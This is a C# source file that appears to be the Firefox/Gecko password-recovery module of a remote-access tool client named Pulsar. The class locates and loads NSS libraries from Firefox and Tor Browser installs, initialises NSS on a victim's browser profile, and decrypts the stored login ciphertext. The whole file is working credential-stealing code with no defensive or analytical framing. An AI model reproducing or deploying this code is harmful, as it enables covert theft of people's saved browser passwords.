using Pulsar.Client.Utilities;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Pulsar.Client.Recovery.Browsers
{
    public sealed class FFDecryptor : IDisposable
    {
        // Delegates
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NssInit(string configDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int Pk11sdrDecrypt(ref TSECItem data, ref TSECItem result, int cx);

        private NssInit _nssInit;
        private NssShutdown _nssShutdown;
        private Pk11sdrDecrypt _pk11Decrypt;

        private IntPtr _nss3;
        private readonly IntPtr[] _loadedLibs = new IntPtr[GeckoNssFiles.Length];

        // Required libs
        private static readonly string[] GeckoNssFiles =
        {
    "mozglue.dll",
    "nssutil3.dll",
    "sqlite3.dll",
    "plc4.dll",
    "plds4.dll",
    "nspr4.dll",
    "freebl3.dll",
    "softokn3.dll",
    "nss3.dll"
};


        // Struct
        [StructLayout(LayoutKind.Sequential)]
        private struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        // ================================================================
        // INIT
        // ================================================================
        public long Init(string profilePath)
        {
            if (string.IsNullOrWhiteSpace(profilePath))
                throw new ArgumentException("Invalid profile path.");

            string nssPath = FindGeckoNssPath(profilePath);
            if (nssPath == null)
                throw new InvalidOperationException("NSS folder not found.");

            // Load dependencies
            for (int i = 0; i < GeckoNssFiles.Length; i++)
            {
                string dllPath = Path.Combine(nssPath, GeckoNssFiles[i]);
                if (File.Exists(dllPath))
                    _loadedLibs[i] = NativeMethods.LoadLibrary(dllPath);
            }

            _nss3 = NativeMethods.LoadLibrary(Path.Combine(nssPath, "nss3.dll"));
            if (_nss3 == IntPtr.Zero)
                throw new Exception("Failed to load nss3.dll");

            _nssInit = Marshal.GetDelegateForFunctionPointer(
                NativeMethods.GetProcAddress(_nss3, "NSS_Init"), typeof(NssInit)) as NssInit;

            _nssShutdown = Marshal.GetDelegateForFunctionPointer(
                NativeMethods.GetProcAddress(_nss3, "NSS_Shutdown"), typeof(NssShutdown)) as NssShutdown;

            _pk11Decrypt = Marshal.GetDelegateForFunctionPointer(
                NativeMethods.GetProcAddress(_nss3, "PK11SDR_Decrypt"), typeof(Pk11sdrDecrypt)) as Pk11sdrDecrypt;

            if (_nssInit == null || _pk11Decrypt == null)
                throw new Exception("Missing NSS exports.");

            return _nssInit(profilePath);
        }

        // ================================================================
        // PATH DISCOVERY
        // ================================================================
        private string FindGeckoNssPath(string profilePath)
        {
            // Tor Browser portable
            string tor = Path.Combine(profilePath, "Browser", "TorBrowser", "Tor", "libnss");
            if (Directory.Exists(tor)) return tor;

            // Portable firefox folder
            string portable = Path.Combine(profilePath, "browser");
            if (Directory.Exists(portable)) return portable;

            // Walk upward
            DirectoryInfo dir = new DirectoryInfo(profilePath);
            while (dir != null && dir.Parent != null)
            {
                DirectoryInfo parent = dir.Parent;

                foreach (var sub in parent.GetDirectories())
                {
                    foreach (string file in GeckoNssFiles)
                    {
                        if (File.Exists(Path.Combine(sub.FullName, file)))
                            return sub.FullName;
                    }
                }

                dir = parent;
            }

            // Standard search in Program Files, AppData, etc
            string[] roots =
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            };

            foreach (string root in roots)
            {
                if (!Directory.Exists(root)) continue;

                foreach (string sub in Directory.GetDirectories(root))
                {
                    foreach (string file in GeckoNssFiles)
                    {
                        if (File.Exists(Path.Combine(sub, file)))
                            return sub;
                    }
                }
            }

            return null;
        }

        // ================================================================
        // DECRYPT
        // ================================================================
        public string Decrypt(string input)
        {
            if (string.IsNullOrWhiteSpace(input))
                return null;

            // NEW FIX
            input = ExtractRealBase64(input);

            string clean = FixBase64(input);
            IntPtr unmanagedPtr = IntPtr.Zero;

            try
            {
                byte[] data = Convert.FromBase64String(clean);
                unmanagedPtr = Marshal.AllocHGlobal(data.Length);
                Marshal.Copy(data, 0, unmanagedPtr, data.Length);

                var item = new TSECItem
                {
                    SECItemType = 0,
                    SECItemData = unmanagedPtr,
                    SECItemLen = data.Length
                };

                var result = new TSECItem();

                if (_pk11Decrypt(ref item, ref result, 0) == 0 && result.SECItemLen > 0)
                {
                    byte[] output = new byte[result.SECItemLen];
                    Marshal.Copy(result.SECItemData, output, 0, result.SECItemLen);
                    return Encoding.UTF8.GetString(output);
                }
            }
            catch
            {
                return null;
            }
            finally
            {
                if (unmanagedPtr != IntPtr.Zero)
                    Marshal.FreeHGlobal(unmanagedPtr);
            }

            return null;
        }
        private static string ExtractRealBase64(string input)
        {
            input = input.Trim();

            // Case 1: Firefox JSON structure
            if (input.StartsWith("{") && input.Contains("ciphertext"))
            {
                try
                {
                    int start = input.IndexOf("\"ciphertext\":\"", StringComparison.Ordinal);
                    if (start != -1)
                    {
                        start += 14; // length of `"ciphertext":"`
                        int end = input.IndexOf("\"", start, StringComparison.Ordinal);
                        if (end != -1)
                        {
                            return input.Substring(start, end - start);
                        }
                    }
                }
                catch { }
            }

            // Case 2: Quoted base64: "AAAABBBBCC=="
            if (input.StartsWith("\"") && input.EndsWith("\""))
                return input.Trim('"');

            // Case 3: Split by comma `"AAAA","BBBB"`
            if (input.Contains(","))
            {
                string[] parts = input.Split(',');
                foreach (string p in parts)
                {
                    string t = p.Trim().Trim('"');
                    if (t.Length > 8 && !t.Contains("{") && !t.Contains("}"))
                        return t;
                }
            }

            // Default
            return input;
        }

        // ================================================================
        // FIX BASE64 (C# 7.3 SAFE)
        // ================================================================
        private static string FixBase64(string input)
        {
            var sb = new StringBuilder(input.Length);

            for (int i = 0; i < input.Length; i++)
            {
                char c = input[i];

                // C# 7.3 safe replacements – no OR patterns
                if ((c >= 'A' && c <= 'Z') ||
                    (c >= 'a' && c <= 'z') ||
                    (c >= '0' && c <= '9') ||
                    c == '+' || c == '/' || c == '=')
                {
                    sb.Append(c);
                }
            }

            string clean = sb.ToString();
            int mod = clean.Length % 4;

            if (mod != 0)
                clean = clean.PadRight(clean.Length + (4 - mod), '=');

            return clean;
        }

        // ================================================================
        // DISPOSE
        // ================================================================
        public void Dispose()
        {
            try { if (_nssShutdown != null) _nssShutdown(); } catch { }

            if (_nss3 != IntPtr.Zero)
            {
                NativeMethods.FreeLibrary(_nss3);
                _nss3 = IntPtr.Zero;
            }

            for (int i = 0; i < _loadedLibs.Length; i++)
            {
                if (_loadedLibs[i] != IntPtr.Zero)
                {
                    NativeMethods.FreeLibrary(_loadedLibs[i]);
                    _loadedLibs[i] = IntPtr.Zero;
                }
            }

            GC.SuppressFinalize(this);
        }
    }
}
